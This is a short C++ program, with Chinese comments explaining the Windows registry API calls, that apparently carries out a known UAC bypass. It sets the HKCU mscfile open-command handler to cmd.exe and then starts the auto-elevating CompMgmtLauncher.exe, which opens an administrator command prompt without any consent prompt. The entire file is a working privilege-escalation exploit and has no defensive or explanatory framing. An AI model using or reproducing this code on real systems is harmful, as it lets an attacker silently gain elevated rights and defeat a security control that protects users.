#include <iostream>
#include <Windows.h>

int main()
{
	PVOID pValue = NULL;
	::Wow64DisableWow64FsRedirection(&pValue); // 关闭文件重定位
	HKEY hKey = NULL;
	::RegCreateKeyEx(
		HKEY_CURRENT_USER, // 针对注册表项的安全描述符检查密钥创建访问权限
		"SOFTWARE\\Classes\\mscfile\\shell\\open\\command", // 打开或创建的子项的名称
		0, // 此参数是保留的，必须为零
		NULL, // 此键的用户定义类类型。 此参数可以忽略。 此参数可以为 NULL
		0, // REG_OPTION_NON_VOLATILE  0x00000000L  此键不可变; 这是默认值。 信息存储在文件中，并在重新启动系统时保留。 RegSaveKey 函数保存不可变的键。
		KEY_WOW64_64KEY | KEY_ALL_ACCESS, // 一个掩码，指定要创建的密钥的访问权限
		NULL, // 指向 SECURITY_ATTRIBUTES 结构的指针，该结构确定返回的句柄是否可以由子进程继承。 如果 lpSecurityAttributes 为 NULL，则无法继承句柄。
		&hKey, // 一个变量的指针，此变量指向已打开或已创建的项的句柄
		NULL // 为 NULL，则不返回处置信息
	);
	if (hKey == NULL)
	{
		printf("RegCreateKeyEx Failed!");
		return -1;
	}
	::RegSetValueEx(
		hKey, // 打开的注册表项的句柄
		NULL, // 要设置的值的名称
		0, // 此参数是保留的，必须为零
		REG_SZ, // lpData 参数指向的数据类型  REG_SZ  以 null 终止的字符串。 这可以是 Unicode 还是 ANSI 字符串，具体取决于是使用 Unicode 还是 ANSI 函数。
		(BYTE*)"C:\\Windows\\System32\\cmd.exe", // 要存储的数据
		strlen("C:\\Windows\\System32\\cmd.exe") + 1 // lpData 参数指向的信息的大小（以字节为单位）如果数据的类型为 REG_SZ、REG_EXPAND_SZ 或 REG_MULTI_SZ， cbData 必须包含终止 null 字符或字符的大小。
	);
	::RegCloseKey(hKey); // 关闭注册表
	system("CompMgmtLauncher.exe");
	::Wow64RevertWow64FsRedirection(pValue); // 开启文件重定位
	system("pause");
	return 0;
}